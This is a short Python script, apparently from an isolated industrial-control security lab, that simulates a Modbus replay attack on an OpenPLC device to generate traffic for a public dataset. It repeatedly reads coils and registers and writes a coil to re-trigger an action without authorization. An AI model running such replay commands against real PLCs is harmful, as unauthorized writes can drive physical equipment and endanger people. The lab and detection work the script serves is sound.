#!/usr/bin/env python3
"""
Modbus baseline replay  (Task 3, Step 3d).

Simulates an attacker that sniffed legitimate Modbus traffic and REPLAYS the
captured commands to the PLC to repeat actions without authorization. Matches
CIC Modbus 2023's "baseline replay".

The requests below represent a command sequence an attacker would have captured
from normal SCADA/gateway traffic; replaying them re-issues those operations.

For ISOLATED lab use only (see SECURITY.md).

Usage (inside Kali):  python3 modbus_replay.py [host] [port] [cycles]
    default host=openplc  port=502  cycles=50
"""
import sys, time
from pymodbus.client import ModbusTcpClient

HOST   = sys.argv[1] if len(sys.argv) > 1 else "openplc"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 502
CYCLES = int(sys.argv[3]) if len(sys.argv) > 3 else 50

c = ModbusTcpClient(HOST, port=PORT)
if not c.connect():
    print(f"[!] could not connect to {HOST}:{PORT}")
    sys.exit(1)

print(f"[*] Replaying captured baseline Modbus commands to {HOST}:{PORT} ({CYCLES} cycles)...")
for _ in range(CYCLES):
    # --- replayed "captured" legitimate command sequence ---
    c.read_coils(0, count=1)                 # replayed read (blink coil)
    c.read_holding_registers(0, count=4)     # replayed read (sensor registers)
    c.write_coil(0, True)                    # replayed command -> repeats an action
    time.sleep(0.2)                          # mimic the original traffic's pacing
c.close()

print(f"[*] Replayed {CYCLES} command cycles -- captured traffic re-injected without authorization.")
